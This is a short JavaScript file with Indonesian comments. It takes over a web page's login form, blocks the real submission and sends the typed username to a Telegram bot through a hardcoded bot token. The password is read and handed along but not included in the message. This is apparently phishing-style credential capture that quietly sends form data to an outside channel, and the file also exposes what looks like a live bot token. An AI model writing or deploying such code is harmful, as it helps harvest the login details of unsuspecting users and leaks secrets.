const loginForm = document.getElementById('login-form');
const tokenBot = '8056667876:AAEO20t2zhQixwouKeX92jdjYqvVS5Nw7YA'; // Ganti dengan token bot Anda

loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Ambil chat ID pengguna secara dinamis
    getChatId(tokenBot, username, password);
});

function getChatId(token, username, password) {
    fetch(`https://api.telegram.org/bot${token}/getUpdates`)
        .then(res => res.json())
        .then(data => {
            if (data.result.length > 0) {
                const chatId = data.result[data.result.length - 1].message.chat.id; 
                kirimDataLogin(token, chatId, username, password);
            } else {
                console.error("Tidak ada chat ID yang ditemukan.");
            }
        })
        .catch(err => console.error(err));
}

function kirimDataLogin(token, chatId, username, password) {
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: `🔒 Login Berhasil!\n📌 Username: ${username}`
        })
    })
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));
}
